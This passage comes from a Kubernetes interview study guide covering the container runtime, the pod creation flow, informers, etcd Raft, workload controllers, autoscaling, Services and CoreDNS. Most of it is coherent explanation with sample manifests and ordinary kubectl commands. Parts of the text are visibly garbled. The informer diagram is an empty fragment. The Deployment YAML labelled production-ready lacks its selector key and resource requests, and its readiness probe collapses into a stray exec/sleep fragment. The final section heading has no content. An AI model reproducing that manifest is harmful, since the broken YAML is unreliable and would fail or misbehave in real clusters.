💡 **When IPVS over iptables?** Clusters with 1,000+ services, or when you need real LB algorithms. iptables performance degrades linearly; IPVS stays constant.

---

## 1.9 Container Runtime

### Concept

The container runtime is the software that actually runs containers on a node. Kubernetes communicates with it via the **CRI (Container Runtime Interface)**, a gRPC API.

### The Runtime Stack

```
Kubernetes (kubelet)
      │ CRI (gRPC)
      ▼
  containerd  ← Industry default, used by EKS, GKE, AKS
      │ OCI spec
      ▼
  runc ← Standard low-level runtime. Uses Linux namespaces + cgroups.

WHAT HAPPENED TO DOCKER IN KUBERNETES:
  K8s 1.24: dockershim FULLY REMOVED from kubelet.
  Docker IMAGES still work — OCI image format is standard.
  containerd runs the same images Docker builds.
```

### Important Details

- **The pause container** — every pod starts with a hidden "pause" container that holds the network namespace. All app containers share it. If pause container dies, all containers restart. Most candidates don't know this.
- EKS uses **containerd** as the default runtime.

---

## ⚠️ 1.10 Pod Creation Flow — End to End

### Concept

Understanding the complete flow of how a pod goes from a `kubectl apply` to a running container is one of the most commonly asked interview questions.

### The Complete Flow

```
═══════════════════════════════════════════════════════════════
POD CREATION — COMPLETE END-TO-END FLOW
═══════════════════════════════════════════════════════════════

Step 1: kubectl apply -f pod.yaml
  • kubectl reads kubeconfig for API server URL + credentials
  • Sends HTTPS POST to API server: POST /api/v1/namespaces/default/pods

Step 2: API Server processes the request
  • Authentication → who are you? (certificate/token/OIDC)
  • Authorization  → RBAC check: can this user create pods in this namespace?
  • Admission      → Mutating webhooks run (inject sidecar, add labels)
                   → Validating webhooks run (OPA/Gatekeeper policy check)
  • Validation     → Schema validation
  • Persist        → Write pod object to etcd with spec.nodeName = ""
  • Respond        → 201 Created to kubectl

Step 3: Scheduler detects unscheduled pod
  • Informer watches pods where spec.nodeName is empty
  • Filtering: eliminate nodes that cannot run this pod
  • Scoring: rank remaining nodes
  • Binding: writes spec.nodeName = "worker-3" to API server → etcd

Step 4: Kubelet on worker-3 detects pod assignment
  • Informer watches pods where spec.nodeName = "worker-3"
  • Sees new pod assigned to its node

Step 5: Kubelet prepares pod
  • Creates pod sandbox (pause container) via CRI → containerd → runc
  • CNI plugin allocates pod IP (AWS VPC CNI assigns ENI IP)
  • Mounts volumes (PVCs via CSI driver, Secrets, ConfigMaps)

Step 6: Kubelet starts containers
  • Runs init containers sequentially (each must exit 0)
  • Starts native sidecar containers (restartPolicy: Always in initContainers)
  • Starts app containers in parallel via CRI
  • containerd → runc → Linux kernel creates process with namespaces + cgroups

Step 7: Kubelet starts probing
  • Startup probe runs first (if configured) — disables other probes
  • Once startup passes: liveness + readiness probes begin
  • Readiness probe passes → pod marked Ready

Step 8: Endpoint registration
  • EndpointSlice controller sees Ready pod matching Service selector
  • Adds pod IP to EndpointSlice → kube-proxy updates iptables/IPVS
  • Traffic can now reach the pod via Service

TOTAL TIME: ~2-5 seconds for a pod on an existing node
            ~2-4 minutes if a new node must be provisioned (CA/Karpenter)
```

### Interview Insights

💡 This is the single most important flow to know for interviews. Practice narrating it end-to-end. Key details interviewers look for: admission webhooks in the pipeline, the scheduler's two-phase process, kubelet's pull model (not push), and that readiness probe must pass before traffic arrives.

## ⚠️ 1.11 Watch & Informer Pattern

### Concept

Controllers don't poll the API server in a loop. Instead they use the **informer pattern** — a framework that efficiently watches resources and maintains a local in-memory cache.

### Why It Exists

Without informers, 50 controllers each polling 10,000 pods every second would melt the API server. The informer pattern reduces this to a single watch connection per resource type, with all reads served from local cache.

### How It Works

```

           └─────────────────────────────────┘
```

### Important Details

- **resourceVersion gap** — if watch disconnects too long and the resourceVersion is compacted from etcd, informer does a full relist. This is expensive and spikes API server load.
- **Work queue deduplication** — the queue stores keys (namespace/name), not objects. Reconciler fetches current state from cache. Intermediate states are silently skipped.
- **Shared informers** — multiple controllers sharing the same resource type share one informer and cache. Critical for efficiency.

### Interview Insights

💡 **Why watch instead of polling?** Watch is O(events) — only process actual changes. Polling is O(objects × frequency) regardless of changes. Watch gives lower latency, lower API load, and no missed events.

💡 **What happens when a watch connection drops?** Informer records last resourceVersion. On reconnect, resumes from that version. If version is compacted, falls back to full LIST + new WATCH.

---

## ⚠️ 1.12 etcd Internals — Raft Consensus

### Concept

etcd uses the **Raft consensus algorithm** to maintain consistency across a distributed cluster. Understanding Raft is important for senior/staff-level interviews.

### How Raft Works

```
═══════════════════════════════════════════════════════════════
RAFT CONSENSUS — HOW WRITES ARE COMMITTED
═══════════════════════════════════════════════════════════════

ROLES:
  Leader   — 1 node. Handles ALL writes. Coordinates replication.
  Follower — All other nodes. Accept replicated logs from leader.
  Candidate — Temporary role during election.

WRITE PATH:
  Step 1: Client sends write to Leader
  Step 2: Leader appends entry to its local log (uncommitted)
  Step 3: Leader sends AppendEntries RPC to ALL followers in PARALLEL
  Step 4: Leader waits for QUORUM acknowledgment (majority respond)
  Step 5: Leader marks entry COMMITTED
  Step 6: Leader applies to state machine and responds SUCCESS to client
  Step 7: Leader notifies followers on next heartbeat

LEADER ELECTION:
  • Follower hasn't heard from leader in election timeout (150-300ms)
  • Follower becomes Candidate, increments term, sends RequestVote RPCs
  • Receives majority votes → becomes new Leader

SPLIT BRAIN PREVENTION:
  Network partition: [Node1] ─ ✂ ─ [Node2, Node3]
  Partition of 1 (Node1): cannot get majority → stays follower
  Partition of 2 (Node2+3): can get majority → elects leader
  Only ONE partition can make progress. No split brain.
```

### MVCC, Compaction, and Defrag

- **MVCC (Multi-Version Concurrency Control):** Every write creates a new revision. Old revisions are retained. This powers the watch mechanism — clients subscribe from a specific revision and receive only changes after that point.
- **Compaction:** Removes old revisions logically (`etcdctl compact`). After compaction, watch clients with old resourceVersion get "410 Gone" and must relist.
- **Defragmentation:** Physically reclaims disk space after compaction (`etcdctl defrag`). Blocking operation — do followers first, leader last.

### Interview Insights

💡 **Linearizability:** Once a write is acknowledged, ALL subsequent reads from any node will see it. etcd guarantees this by routing reads through the leader or using ReadIndex.

💡 **Leader's disk is the bottleneck.** The leader handles all writes and fsyncs. A slow leader disk slows the entire cluster. Monitor `wal_fsync_duration_seconds`.

---

## 1.13 Leader Election in Control Plane

### Concept

The scheduler and controller manager use **leader election** so that only one instance is active at a time. They create **Lease objects** in etcd and use optimistic concurrency to compete for leadership.

### How It Works

- Each instance tries to acquire a Lease object (e.g., `kube-scheduler` Lease in `kube-system`).
- The holder renews the lease every few seconds.
- If the holder dies and the lease expires, a standby instance acquires it and becomes the new active leader.
- API servers do NOT use leader election — they are all active simultaneously behind a load balancer.

```bash
# See current leaders
kubectl get leases -n kube-system
# NAME                      HOLDER                              AGE
# kube-scheduler            control-plane-node-1_abc123         5d
# kube-controller-manager   control-plane-node-2_def456         5d
```

### Interview Insights

💡 **Why don't API servers need leader election?** They're stateless request handlers — consistency is guaranteed by etcd via optimistic concurrency (resourceVersion checks). Two API servers writing the same object simultaneously → etcd rejects one with 409 Conflict → client retries.

---

## 1.14 API Server HA

### Concept

Multiple API server instances run simultaneously behind a load balancer. They are all active (no leader election needed).

```
  ┌──────────────────────────────────────────────────────────┐
  │              LOAD BALANCER (L4)                          │
  │   (AWS NLB in EKS)                                       │
  └────────────┬──────────────────────────┬──────────────────┘
               │                          │
    ┌──────────┴──────────┐    ┌──────────┴──────────┐
    │    API Server 1     │    │    API Server 2     │
    │    (ACTIVE)         │    │    (ACTIVE)         │
    └──────────┬──────────┘    └──────────┬──────────┘
               └─────────────┬────────────┘
                    ┌────────┴────────┐
                    │  etcd cluster   │
                    └─────────────────┘
```

### Important Details

- **Optimistic concurrency** prevents conflicts: every object has a resourceVersion. When updating, the client includes the current version. etcd checks if it's still current — if not, 409 Conflict.
- When a watch client's API server dies, the client reconnects to another API server (via LB) and resumes the watch from its last resourceVersion.

---

## 1.15 CRDs — Custom Resource Definitions (Basic)

### Concept

CRDs let you extend the Kubernetes API with your own resource types. Once defined, you can `kubectl get/create/delete` your custom resources just like built-in resources.

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: mysqlclusters.database.example.com
spec:
  group: database.example.com
  names:
    kind: MySQLCluster
    plural: mysqlclusters
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          spec:
            type: object
            properties:
              replicas:
                type: integer
              version:
                type: string
```

### Interview Insights

💡 CRDs define the API. A **custom controller** (Operator) watches these CRDs and reconciles them — e.g., creating StatefulSets, setting up replication, managing backups.

---

## 1.16 Disaster Recovery — High Level

### Concept

Kubernetes disaster recovery centers on etcd backups (the source of all cluster state), infrastructure-as-code for reproducible cluster creation, and GitOps for application state.

### Key Strategies

- **etcd snapshots:** Regular `etcdctl snapshot save`. Store encrypted in S3. Test restores regularly.
- **Velero:** Backs up Kubernetes resources and PVs. Can restore to a different cluster.
- **Infrastructure as Code:** Terraform/Pulumi for cluster creation. Entire cluster can be recreated from code.
- **GitOps (ArgoCD/Flux):** Application manifests in Git. Cluster can be rebuilt by pointing ArgoCD at the same Git repo.

### AWS EKS Alignment

In EKS, AWS manages etcd backups. For DR, focus on:
- **EBS snapshots** for PersistentVolumes
- **Velero** for K8s resource backup/restore
- **Cross-region EKS cluster** for true DR
- **Route 53 health checks** for failover routing

# 2. WORKLOADS

## 2.1 Pods

### Concept

A Pod is the **smallest deployable unit** in Kubernetes — a wrapper around one or more containers that share networking (same IP, same ports), storage (shared volumes), and lifecycle. Containers within a pod communicate via localhost.

### Why It Is Used

Containers are designed to run a single process. But some applications need tightly coupled helper processes (e.g., log shipper alongside app). Pods group these co-dependent containers, sharing network namespace and storage.

### Important Details

- Pods are **ephemeral** — they are not self-healing on their own. If a pod dies, nothing restarts it unless a controller (Deployment, RS, etc.) manages it.
- Every pod gets a **unique IP address** from the pod CIDR range. In EKS with VPC CNI, this is a real VPC IP.
- All containers in a pod share the same network namespace — they can reach each other on `localhost`.
- Pods should rarely be created directly. Always use a controller (Deployment, StatefulSet, Job).

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: myapp
  namespace: production
  labels:
    app: myapp
spec:
  containers:
  - name: app
    image: myapp:v1
    ports:
    - containerPort: 8080
    resources:
      requests:
        cpu: "250m"
        memory: "256Mi"
      limits:
        cpu: "500m"
        memory: "512Mi"
```

### Interview Insights

💡 **Why pods and not just containers?** Pods provide a shared execution environment — shared network namespace (localhost communication), shared storage volumes, shared IPC namespace. This enables the sidecar pattern where helper containers augment the main app without modifying it.

💡 **Never create bare pods in production.** They have no self-healing. Use Deployments, StatefulSets, or Jobs.

---

## 2.2 ReplicaSet

### Concept

A ReplicaSet ensures a specified number of pod replicas are running at any time. It uses **label selectors** to identify its pods and creates or deletes pods to match the desired count.

### How It Works

```
ReplicaSet: myapp-rs (replicas: 3)

RECONCILIATION:
  desired: 3
  actual:  2  (one crashed)
  diff:   +1 → Create 1 new pod from spec.template
  actual: 3  ✓ no action needed until next change

LABEL SELECTOR OWNERSHIP:
  RS does NOT track pod UUIDs.
  It COUNTS pods matching its selector at reconciliation time.
  If you manually create a pod with matching labels → RS sees 4 > 3 → deletes one.
```

### Important Details

- Label selector is **immutable** after creation — you cannot change `spec.selector`.
- You rarely create ReplicaSets directly — **Deployments** create and manage them.
- RS alone has no rolling update mechanism.

### Interview Insights

💡 **Difference from Deployment?** RS only ensures desired pod count. Deployment manages RS to provide rolling updates, rollbacks, and history. RS is a building block; Deployment is what you use.

---

## 2.3 Deployment

### Concept

A Deployment manages ReplicaSets and adds **rolling updates, rollbacks, and declarative update strategies**. It is the standard way to run stateless applications.

### How It Works

```
Deployment: myapp
  │
  ├── ReplicaSet: myapp-7d4f8b9c6  (current — v2)  replicas: 3
  │       ├── Pod: myapp-7d4f8b9c6-abc12  [v2]
  │       ├── Pod: myapp-7d4f8b9c6-def34  [v2]
  │       └── Pod: myapp-7d4f8b9c6-ghi56  [v2]
  │
  └── ReplicaSet: myapp-6b3a9d8f1  (previous — v1) replicas: 0
          (kept at 0 for rollback — NOT deleted)

WHAT TRIGGERS A NEW REPLICASET:
  ✓ image change, env var change, resource limit change → new RS
  ✗ replicas change, strategy change, annotation change → NO new RS
```

### Production-Ready YAML

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: production
spec:
  replicas: 3
  revisionHistoryLimit: 5       # keep last 5 RS for rollback
  progressDeadlineSeconds: 600  # fail if no progress in 10min

    matchLabels:
      app: myapp

  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1          # max pods ABOVE desired during update
      maxUnavailable: 0    # zero-downtime rolling update

  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: app
        image: myapp:v2.1.0

            memory: "256Mi"
          limits:
            cpu: "500m"
            memory: "512Mi"
        readinessProbe:

            exec:
              command: ["/bin/sh", "-c", "sleep 5"]
      terminationGracePeriodSeconds: 60
```

### Essential Operations

```bash
kubectl apply -f deployment.yaml
kubectl set image deployment/myapp app=myapp:v2.2.0   # quick image update
kubectl rollout status deployment/myapp                # monitor rollout
kubectl rollout pause deployment/myapp                 # canary: pause mid-rollout
kubectl rollout resume deployment/myapp                # resume rollout
kubectl rollout history deployment/myapp               # view revisions
kubectl rollout undo deployment/myapp                  # rollback to previous
kubectl rollout undo deployment/myapp --to-revision=2  # rollback to specific
kubectl rollout restart deployment/myapp               # rolling restart same image
kubectl scale deployment/myapp --replicas=10           # scale
```

### Interview Insights

💡 **The default strategy is NOT zero-downtime.** Default `maxUnavailable: 25%` means capacity drops. Explicitly set `maxUnavailable: 0` for zero-downtime.

💡 **progressDeadlineSeconds is critical.** Without it, a stuck deployment (bad image, failing readiness) appears as "Progressing" indefinitely. Set it and alert on it.

💡 **revisionHistoryLimit default is 10.** With many deployments and frequent CI/CD, dead RS objects accumulate in etcd. Set to 3-5.

---

## ⚠️ 2.4 StatefulSet

### Concept

StatefulSet manages **stateful applications** where pods need stable identities — stable names, stable network identity (DNS), and stable persistent storage that survives restarts.

### Why Deployments Fail for Databases

Deployment pods have random names (change on reschedule), no dedicated storage per pod, start simultaneously (breaks ordered cluster formation), and scale down randomly (could kill the primary).

### The Four Guarantees

```
StatefulSet: mysql (replicas: 3)

GUARANTEE 1: STABLE NAMES
  mysql-0, mysql-1, mysql-2 — never random suffixes
  After reschedule: still mysql-0

GUARANTEE 2: STABLE DNS (requires headless service)
  mysql-0.mysql.production.svc.cluster.local → always resolves to mysql-0's IP
  DNS updates automatically on reschedule to new node

GUARANTEE 3: STABLE STORAGE
  PVC: data-mysql-0 follows pod mysql-0 forever
  Data persists across all restarts and reschedules

GUARANTEE 4: ORDERED OPERATIONS (default)
  Scale UP:   0 → 1 → 2 (each must be Ready before next)
  Scale DOWN: 2 → 1 → 0 (reverse order — protects primary)
  Update:     2 → 1 → 0 (replicas first, primary last)
```

### Production YAML

```yaml
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: mysql
  namespace: production
spec:
  serviceName: "mysql"         # REQUIRED: headless service name
  replicas: 3
  podManagementPolicy: OrderedReady    # or Parallel
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      partition: 0             # canary: set to 2 to update only pod-2 first
  selector:
    matchLabels:
      app: mysql
  template:
    metadata:
      labels:
        app: mysql
    spec:
      terminationGracePeriodSeconds: 60
      containers:
      - name: mysql
        image: mysql:8.0
        ports:
        - containerPort: 3306
        volumeMounts:
        - name: data
          mountPath: /var/lib/mysql
  volumeClaimTemplates:
  - metadata:
      name: data
    spec:
      accessModes: ["ReadWriteOnce"]
      storageClassName: "gp3"
      resources:
        requests:
          storage: 100Gi

---
# Headless service — REQUIRED for stable per-pod DNS
apiVersion: v1
kind: Service
metadata:
  name: mysql
spec:
  clusterIP: None      # THIS makes it headless
  selector:
    app: mysql
  ports:
  - port: 3306
```

### Interview Insights

💡 **Deployment vs StatefulSet:** Deployment pods are interchangeable. StatefulSet pods have identity. Use Deployment for stateless, StatefulSet for databases and distributed systems needing stable identity.

💡 **Headless service is REQUIRED.** Without `clusterIP: None`, per-pod DNS entries don't exist and stable network identity is broken.

💡 **PVCs are NOT deleted when StatefulSet is deleted** — safety feature. Configure `persistentVolumeClaimRetentionPolicy` to control behavior.

💡 **Partition for canary:** Set `partition: 2` → only pod-2 gets updated. Validate, then lower to 1, then 0.

---

## 2.5 DaemonSet

### Concept

A DaemonSet ensures **exactly one copy of a pod runs on every node** (or nodes matching a selector). When nodes join, pods auto-deploy. When nodes leave, pods are cleaned up.

### Use Cases

```
fluentd / fluent-bit       → log collection per node
node-exporter              → node hardware metrics
kube-proxy                 → Service networking (IS a DaemonSet)
calico-node / cilium-agent → CNI network plugin
aws-node (vpc-cni)         → EKS pod networking
falco                      → runtime security scanning
```

### Important Details

- DaemonSet controller directly sets `spec.nodeName`, **bypassing scheduler scoring** (but taints/tolerations still apply).
- Control plane nodes need **explicit tolerations** — they have `node-role.kubernetes.io/control-plane:NoSchedule` taint by default.
- `updateStrategy: OnDelete` — pods only get new spec when manually deleted. Useful for critical node-level daemons.

### Interview Insights

💡 **DaemonSet vs Deployment with pod anti-affinity?** DaemonSet guarantees exactly one per node and auto-expands to new nodes. Deployment with anti-affinity is manual, fragile, and doesn't auto-deploy to new nodes.

---

## 2.6 Job & CronJob

### Concept

**Job** runs pods to **completion** — ensures a task finishes, retrying on failure. **CronJob** creates Jobs on a cron schedule.

### Job Patterns

```
Pattern 1: Single completion (completions: 1, parallelism: 1)
  One task, run once. Use for: DB migrations, one-off scripts.

Pattern 2: Fixed count (completions: N, parallelism: M)
  N successful completions needed, M workers at a time.

Pattern 3: Work queue (completions: unset, parallelism: N)
  Workers pull from queue. Job completes when any pod exits 0.
```

### Key Settings

```yaml
apiVersion: batch/v1
kind: Job
spec:
  completions: 1
  parallelism: 1
  backoffLimit: 4             # retry up to 4 times
  activeDeadlineSeconds: 300  # kill if not done in 5 min
  ttlSecondsAfterFinished: 86400  # auto-delete after 24h

  template:
    spec:
      restartPolicy: OnFailure    # REQUIRED: must be OnFailure or Never
      containers:
      - name: migration
        image: myapp:v2
        command: ["python", "manage.py", "migrate"]
```

```yaml
apiVersion: batch/v1
kind: CronJob
spec:
  schedule: "0 2 * * *"           # 2 AM daily
  timeZone: "America/New_York"    # K8s 1.27+
  concurrencyPolicy: Forbid       # skip if previous still running
  startingDeadlineSeconds: 300
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 3
```

### Interview Insights

💡 **restartPolicy: Always is forbidden in Jobs.** Must be OnFailure or Never.

💡 **concurrencyPolicy: Allow is dangerous** — jobs pile up if they run longer than schedule interval. Use Forbid.

💡 **ttlSecondsAfterFinished default is nil** — completed Jobs accumulate forever, causing etcd bloat. Always set it.

---

## 2.7 Init Containers

### Concept

Init containers run **sequentially to completion before any app container starts**. Each must exit 0 before the next begins. They externalize prerequisites from app code.

### Execution Flow

```
Pod starts → init containers run IN ORDER:
  [wait-for-postgres] → exit 0 →
  [run-migrations]    → exit 0 →
  [fetch-config]      → exit 0 →
  [APP CONTAINER starts NOW]

Pod status during init:
  Init:0/3 → Init:1/3 → Init:2/3 → PodInitializing → Running
```

### Key Properties

- Run sequentially, one at a time
- Must exit 0 to proceed — exit 1 triggers pod restart
- Can use DIFFERENT images than app (e.g., curl, vault CLI)
- Can share volumes with app containers (emptyDir pattern)
- Do NOT run liveness or readiness probes

### Interview Insights

💡 **Init vs regular container:** Init runs sequentially before app, must complete, no probes. Regular runs concurrently, runs indefinitely, supports probes.

💡 **Never run DB migrations in init containers.** With 3 replicas, migration runs 3 times simultaneously. Use Helm pre-upgrade hook Job instead.

---

## 2.8 Sidecar Containers

### Concept

A sidecar is a helper container running alongside the main app to provide cross-cutting concerns (logging, proxy, secret injection) without modifying app code.

### Native Sidecars (K8s 1.29+)

```yaml
spec:
  initContainers:
  - name: log-shipper
    image: fluent-bit:2.2
    restartPolicy: Always    # ← THIS makes it a native sidecar
    # Starts BEFORE app, stays running, exits AFTER app terminates

  containers:
  - name: app
    image: myapp:v1
```

### Why Native Sidecars Were Added

Old pattern had three problems: startup race (sidecar not ready when app starts), termination ordering (sidecar stops before app drains), and Job completion (Istio sidecar never exits → Job never completes). Native sidecars fix all three.

### Interview Insights

💡 **Native sidecar = `restartPolicy: Always` inside `initContainers`.** Counter-intuitive syntax, but it means: start before app, run alongside it, exit after app.

---

## ⚠️ 2.9 Deployment Strategies

### RollingUpdate (Default)

```
replicas=4, maxSurge=1, maxUnavailable=0 (zero-downtime):

  [v1] [v1] [v1] [v1]
  [v1] [v1] [v1] [v1] [v2]    ← create v2 FIRST
  [v1] [v1] [v1] [v2]         ← kill v1 only AFTER v2 Ready
  ... continues until all v2

⚠️ Both v1 and v2 serve traffic simultaneously during rollout!
   App MUST be backward compatible.
```

### Recreate

```
Kill ALL v1 → DOWNTIME → Create ALL v2

Use when: schema changes break old version, exclusive locks needed,
          single-writer configs, versions cannot coexist.
```

### maxSurge & maxUnavailable

```
Zero-downtime:     maxSurge: 1,    maxUnavailable: 0    (recommended)
Fast rollout:      maxSurge: 0,    maxUnavailable: "25%"
Default (NOT safe): maxSurge: "25%", maxUnavailable: "25%"

⚠️ BOTH CANNOT BE 0 — no progress possible.
⚠️ DEFAULT IS NOT ZERO-DOWNTIME — explicitly set maxUnavailable: 0.
```

### Interview Insights

💡 **Rolling updates require backward compatibility** — during the rollout, both versions receive traffic. Use expand-contract migration pattern for schema changes.

---

## ⚠️ 2.10 Pod Lifecycle

### Phases and Conditions

```
PHASES:
  Pending   → Accepted, not yet running (scheduling, pulling images)
  Running   → At least one container running
  Succeeded → All containers exited 0 (Jobs)
  Failed    → All containers terminated, at least one exited non-0
  Unknown   → Node communication lost

CONDITIONS (evaluated independently):
  PodScheduled     → assigned to a node
  Initialized      → all init containers completed
  ContainersReady  → all containers passing readiness probes
  Ready            → pod can receive traffic (ContainersReady + readinessGates)

⚠️ Running ≠ Ready. A Running pod with a failing readiness probe receives NO traffic.
```

### Termination Sequence

```
1. Pod marked for deletion
2. EndpointSlice controller removes pod from service endpoints
3. preStop hook executes (e.g., sleep 5 for propagation delay)
4. SIGTERM sent to all containers
5. Grace period countdown (terminationGracePeriodSeconds, default 30s)
6. If still running: SIGKILL

⚠️ preStop counts against grace period!
   preStop(10s) + app drain(30s) with grace=30s → app gets only 20s.
   Set grace period ≥ preStop + expected drain time.
```

🔧 **Production recommendation:** `terminationGracePeriodSeconds: 60` and `preStop: sleep 5` to allow kube-proxy endpoint propagation.

---

## ⚠️ 2.11 PodDisruptionBudget (PDB)

### Concept

PDB limits how many pods can be **voluntarily disrupted** simultaneously during node drains, cluster upgrades, and maintenance.

```yaml
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: myapp-pdb
spec:
  minAvailable: 2        # minimum pods that MUST remain
  # OR: maxUnavailable: 1  # maximum pods that CAN be down
  selector:
    matchLabels:
      app: myapp
```

### Interview Insights

💡 **PDB only protects voluntary disruptions** — node failures, OOM kills, liveness restarts all bypass PDB.

💡 **minAvailable = replicas → deadlock.** Zero allowed disruptions. `kubectl drain` waits forever. Always leave at least 1 disruption allowed.

💡 **Check `kubectl get pdb` before any maintenance.** `ALLOWED DISRUPTIONS = 0` means drain will block.

---

## ⚠️ 2.12 Horizontal Pod Autoscaler (HPA)

### How It Works

```
HPA control loop (every 15 seconds):
  1. Query metrics-server for CPU/memory (or custom metrics API)
  2. Calculate: desired = ceil(current × (currentMetric / targetMetric))
  3. Apply scale-down stabilization (default 5 min)
  4. Clamp: minReplicas ≤ desired ≤ maxReplicas
  5. Update Deployment replica count
```

### Production YAML

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 50
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 60
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300   # prevent thrashing
      policies:
      - type: Percent
        value: 10
        periodSeconds: 60
    scaleUp:
      stabilizationWindowSeconds: 0     # scale up immediately
      policies:
      - type: Percent
        value: 100
        periodSeconds: 15
```

### Interview Insights

💡 **HPA requires resource requests.** CPU utilization is calculated as % of request. No request = HPA cannot calculate = no scaling. This is the most common HPA misconfiguration.

💡 **HPA cannot scale to zero.** minReplicas must be ≥ 1. Use KEDA for scale-to-zero.

💡 **HPA + VPA conflict on CPU.** Don't use both on CPU. Use HPA for CPU scaling, VPA in recommend-only mode.

---

## 2.13 VPA (Vertical Pod Autoscaler)

### Concept

VPA adjusts pod **resource requests and limits** based on actual usage history, making pods the right size rather than adding more of them.

### Modes

```
Off:          VPA only generates recommendations (inspect with kubectl)
              Use this first to understand actual usage.
Initial:      Apply recommendations at pod creation only (not existing pods)
Auto:         Evict and recreate pods with new recommendations
              ⚠️ Causes disruptions — pods are recreated!
```

### Important Details

- VPA **evicts pods** to resize them (no in-place resize yet for most clusters).
- **Do NOT use VPA Auto + HPA on the same metric (CPU).** They conflict. Use HPA for CPU horizontal scaling, VPA in Off mode for memory right-sizing recommendations.
- VPA is most useful for setting initial resource requests based on historical data.

---

# 3. NETWORKING

---

## 3.1 Kubernetes Networking Model

### Concept

Kubernetes enforces a **flat networking model** with four fundamental rules:

```
RULE 1: Every Pod gets its own unique IP address
RULE 2: All Pods can communicate with all other Pods — no NAT
RULE 3: All Nodes can communicate with all Pods
RULE 4: Pods see their own IP (not a NAT-translated address)
```

These rules are contract, not mechanism. CNI plugins (Flannel, Calico, Cilium, AWS VPC CNI) implement them differently.

### Address Ranges (Three Separate, Non-Overlapping)

```
NODE IPs:    VPC CIDR (e.g., 10.0.0.0/16) — EC2 instance IPs
POD IPs:     Pod CIDR — VPC CNI gives real VPC IPs to pods on EKS
SERVICE IPs: Service CIDR (e.g., 10.100.0.0/16) — virtual IPs, exist only in iptables/IPVS

EKS specifics:
  Pod IPs are real VPC IPs (no overlay network) via aws-vpc-cni
  This means pods are directly routable from the VPC
  But it consumes VPC IP addresses — plan CIDR space carefully
```

### Interview Insights

💡 **Pod-to-pod same node:** Traffic stays on local bridge — never leaves the node.

💡 **Pod-to-pod cross node:** Source pod → CNI (VXLAN/VPC routing) → destination node → destination pod. No NAT.

💡 **EKS advantage:** VPC CNI assigns real VPC IPs to pods. No overlay. Direct VPC routing. But IP exhaustion is a real concern — use prefix delegation for large clusters.

---

## 3.2 Services — ClusterIP, NodePort, LoadBalancer, ExternalName

### Concept

Services provide stable networking for a set of pods. Pods are ephemeral with changing IPs; Services give you a stable virtual IP and DNS name that load-balances across backing pods.

### Service Types

```
ClusterIP (default):
  Virtual IP accessible only within the cluster.
  kube-proxy programs iptables/IPVS rules.
  Use for: internal microservice communication.

NodePort:
  Exposes service on a static port (30000-32767) on every node's IP.
  External traffic can reach the service via <NodeIP>:<NodePort>.
  Use for: simple external access (dev/test).

LoadBalancer:
  Provisions a cloud load balancer (AWS NLB/ALB) in front of NodePort.
  Gives you an external IP/DNS.
  On EKS: creates an AWS NLB by default.
  Use for: production external-facing services.

ExternalName:
  Pure DNS CNAME — no proxying, no ClusterIP.
  Resolves to an external DNS name.
  Use for: referencing external services (RDS, external APIs).
```

```yaml
# ClusterIP (internal)
apiVersion: v1
kind: Service
metadata:
  name: api-service
spec:
  type: ClusterIP
  selector:
    app: api
  ports:
  - port: 80
    targetPort: 8080

---
# LoadBalancer (external on EKS)
apiVersion: v1
kind: Service
metadata:
  name: api-lb
  annotations:
    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
    service.beta.kubernetes.io/aws-load-balancer-scheme: "internet-facing"
spec:
  type: LoadBalancer
  externalTrafficPolicy: Local   # preserves client source IP
  selector:
    app: api
  ports:
  - port: 443
    targetPort: 8080
```

### ExternalTrafficPolicy

```
Cluster (default): any node can forward to any pod. Extra hop possible. Source IP lost (SNAT).
Local: node only routes to pods on THIS node. No SNAT → source IP preserved.
  Cloud LB health-checks nodes → only routes to nodes with local pods.
```

### Interview Insights

💡 **How does Service discovery work?** Two mechanisms: DNS (`api-service.namespace.svc.cluster.local`) and environment variables (injected into pods at startup). DNS is preferred.

💡 **externalTrafficPolicy: Local** — use when you need client source IP (WAF, geo-routing, logging).

---

## ⚠️ 3.3 DNS in Kubernetes (CoreDNS)

### Concept

CoreDNS is the cluster DNS server. Every pod gets DNS configured to resolve Kubernetes service names.

### DNS Resolution Rules

```
FULLY QUALIFIED DNS NAMES:
  Service:    <svc>.<namespace>.svc.cluster.local
  Pod:        <pod-ip-dashes>.<namespace>.pod.cluster.local
  StatefulSet: <pod-name>.<headless-svc>.<namespace>.svc.cluster.local

SEARCH DOMAINS (configured in /etc/resolv.conf of every pod):
  search default.svc.cluster.local svc.cluster.local cluster.local
  nameserver 10.96.0.10  ← CoreDNS ClusterIP

SHORT NAME RESOLUTION:
  From pod in "production" namespace:
    "api-service"           → api-service.production.svc.cluster.local
    "api-service.staging"   → api-service.staging.svc.cluster.local
```

### CoreDNS Debugging

```bash
# Check CoreDNS pods
kubectl get pods -n kube-system -l k8s-app=kube-dns

# Test DNS from a debug pod
kubectl run test --image=nicolaka/netshoot --rm -it --restart=Never -- bash
  nslookup api-service.production.svc.cluster.local
  dig +short api-service.production.svc.cluster.local
  cat /etc/resolv.conf

# Check CoreDNS logs
kubectl logs -n kube-system -l k8s-app=kube-dns --tail=50

# Common DNS issues:
# SERVFAIL → CoreDNS pods not running or OOM
# NXDOMAIN → Service doesn't exist or wrong namespace
# Timeout  → Network policy blocking DNS, or CoreDNS overloaded
```

### Interview Insights

